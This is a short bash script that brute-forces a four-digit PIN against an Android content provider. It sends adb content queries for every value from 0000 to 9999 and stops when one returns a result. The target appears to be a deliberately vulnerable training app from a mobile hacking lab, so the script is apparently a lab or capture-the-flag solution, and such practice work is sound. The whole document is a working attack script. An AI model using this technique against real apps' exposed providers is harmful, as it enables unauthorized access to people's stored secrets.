#!/bin/bash

for i in $(seq -w 0 9999); do
  echo -n "Testing $i: "
  res=$(adb shell content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where "pin=$i")
  if [[ "$res" != "No result found." ]]; then
    echo "FOUND IT! Result: $res"
    break
  fi
done
